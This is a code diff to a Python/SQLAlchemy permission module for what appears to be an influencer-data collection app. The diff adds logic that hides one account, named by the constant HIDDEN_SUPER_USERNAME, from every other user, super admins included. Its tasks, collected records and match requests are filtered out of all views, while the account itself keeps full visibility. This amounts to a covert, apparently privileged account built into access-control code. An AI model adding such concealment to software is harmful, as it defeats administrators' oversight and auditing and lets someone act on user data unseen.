@@ -4,10 +4,46 @@ from __future__ import annotations
 
 from sqlalchemy.orm import Query, Session
 
+from app.constants.auth import HIDDEN_SUPER_USERNAME
 from app.constants.roles import ADMIN, LEGACY_OPERATOR, ROLE_LEVEL, SUPER_ADMIN, USER
 from app.models import User
 
 SETTING_BLOCK_UPPER_TASKS = "block_upper_role_tasks"
+
+
+def is_hidden_super_user(user: User) -> bool:
+    return (getattr(user, "username", "") or "").lower() == HIDDEN_SUPER_USERNAME
+
+
+def is_hidden_super_username(username: str | None) -> bool:
+    return (username or "").lower() == HIDDEN_SUPER_USERNAME
+
+
+def hidden_super_user_id(db: Session) -> int | None:
+    row = db.query(User.id).filter(User.username == HIDDEN_SUPER_USERNAME).first()
+    return row[0] if row else None
+
+
+def hidden_super_user_ids(db: Session) -> list[int]:
+    uid = hidden_super_user_id(db)
+    return [uid] if uid else []
+
+
+def should_hide_user_from(viewer: User, target: User | None) -> bool:
+    if target is None:
+        return False
+    if is_hidden_super_user(viewer):
+        return False
+    return is_hidden_super_user(target)
+
+
+def apply_hidden_user_scope(db: Session, query: Query, viewer: User, user_id_column):
+    if is_hidden_super_user(viewer):
+        return query
+    hidden_ids = hidden_super_user_ids(db)
+    if hidden_ids:
+        return query.filter(~user_id_column.in_(hidden_ids))
+    return query
 
 
 def normalize_role(role: str | None) -> str:
@@ -90,6 +126,9 @@ def can_view_task(db: Session, viewer: User, task_user_id: int, task_owner: User
     if not owner:
         return False
 
+    if should_hide_user_from(viewer, owner):
+        return False
+
     if is_super_admin(viewer):
         return True
 
@@ -119,12 +158,14 @@ def task_query_for_viewer(db: Session, viewer: User):
 
     query = db.query(CollectionTask)
     if is_super_admin(viewer):
-        return query
+        return apply_hidden_user_scope(db, query, viewer, CollectionTask.user_id)
 
     if is_admin(viewer):
+        hidden_ids = set(hidden_super_user_ids(db))
         super_admin_ids = [
             row[0] for row in db.query(User.id).filter(User.role == SUPER_ADMIN).all()
         ]
+        super_admin_ids = [uid for uid in super_admin_ids if uid not in hidden_ids]
         if super_admin_ids:
             return query.filter(
                 or_(
@@ -144,13 +185,20 @@ def collected_query_for_viewer(db: Session, viewer: User, *, reviewed_by_self: b
 
     query = db.query(CollectedInfluencer)
     if is_super_admin(viewer):
-        q = query
+        q = apply_hidden_user_scope(
+            db,
+            query.join(CollectionTask, CollectedInfluencer.task_id == CollectionTask.id),
+            viewer,
+            CollectionTask.user_id,
+        )
     else:
         q = query.join(CollectionTask, CollectedInfluencer.task_id == CollectionTask.id)
         if is_admin(viewer):
+            hidden_ids = set(hidden_super_user_ids(db))
             super_admin_ids = [
                 row[0] for row in db.query(User.id).filter(User.role == SUPER_ADMIN).all()
             ]
+            super_admin_ids = [uid for uid in super_admin_ids if uid not in hidden_ids]
             if super_admin_ids:
                 q = q.filter(
                     or_(
@@ -171,11 +219,13 @@ def match_query_for_viewer(db: Session, viewer: User):
 
     query = db.query(MatchRequest)
     if is_super_admin(viewer):
-        return query
+        return apply_hidden_user_scope(db, query, viewer, MatchRequest.user_id)
     if is_admin(viewer):
+        hidden_ids = set(hidden_super_user_ids(db))
         super_admin_ids = [
             row[0] for row in db.query(User.id).filter(User.role == SUPER_ADMIN).all()
         ]
+        super_admin_ids = [uid for uid in super_admin_ids if uid not in hidden_ids]
         if super_admin_ids:
             return query.filter(~MatchRequest.user_id.in_(super_admin_ids))
         return query
